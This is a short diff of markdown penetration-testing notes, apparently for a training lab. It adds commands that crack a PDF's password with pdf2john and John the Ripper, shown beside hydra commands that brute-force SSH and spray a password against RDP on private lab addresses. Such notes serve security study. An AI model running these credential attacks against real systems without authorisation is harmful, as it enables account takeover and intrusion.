@@ -10,6 +10,13 @@ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 ```
 
+#### Cracking PDF
+
+```bash
+pdf2john Infrustructure.pdf > pdf.hash
+john -wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
+```
+
 #### Hydra FTP Example (with known usernames)
 
 ```bash
